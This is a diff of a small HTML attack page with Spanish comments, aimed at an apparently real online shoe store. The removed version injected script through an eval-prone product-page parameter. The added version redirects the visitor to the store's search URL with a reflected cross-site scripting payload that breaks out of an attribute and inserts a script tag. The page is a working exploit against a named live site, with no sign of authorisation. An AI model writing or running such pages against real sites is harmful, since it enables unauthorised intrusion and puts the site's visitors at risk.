@@ -1,17 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head><title>Oferta Especial</title></head>
 <body>
     <script>
-        // Payload: Creamos un elemento script y lo añadimos al cuerpo
-        // para que no dependa de la respuesta del servidor.
-        const payload = "alert('Vulnerabilidad Confirmada: XSS sin interaccion'); document.body.style.background='red';";
+        // Intentamos un XSS reflejado clásico que no dependa del eval() de Analytics
+        // Probamos inyectando en el parámetro de búsqueda o etiquetas
+        const payload = '"><script>alert("XSS_REAL_SIN_INTERACCION")<\/script>';
+        const urlVulnerable = "https://maszapatillas.com/es/buscar?controller=search&s=" + encodeURIComponent(payload);
         
-        // El truco: Inyectamos el payload como un parámetro que 'eval' pueda pescar
-        // Probamos con la URL del producto pero forzando que el script de la web se active
-        const urlFinal = "https://maszapatillas.com/es/zapatillas-mujer/47194-143055-zapatillas-adidas-spezial-.html?action=shopperPrices&data=[{\"id\":\"1\",\"js\":\"" + payload + "\"}]";
-
-        window.location.href = urlFinal;
+        window.location.href = urlVulnerable;
     </script>
 </body>
 </html>
